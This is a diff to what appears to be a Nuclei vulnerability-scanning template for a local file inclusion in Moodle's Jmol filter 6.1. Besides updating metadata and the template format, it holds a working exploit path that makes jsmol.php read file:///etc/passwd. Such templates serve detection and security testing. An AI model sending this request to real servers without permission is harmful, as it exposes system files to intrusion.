@@ -1,4 +1,5 @@
 id: moodle-filter-jmol-lfi
+
 info:
   name: Moodle Jmol Filter 6.1 - Local File Inclusion
   author: madrobot
@@ -7,11 +8,14 @@ info:
   reference:
     - https://www.exploit-db.com/exploits/46881
   classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:W/RC:C
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:F/RL:W/RC:C
     cvss-score: 7.5
     cwe-id: CWE-22
-  tags: moodle,lfi
-requests:
+  tags: moodle,lfi,edb
+  metadata:
+    max-request: 1
+
+http:
   - method: GET
     path:
       - "{{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd"
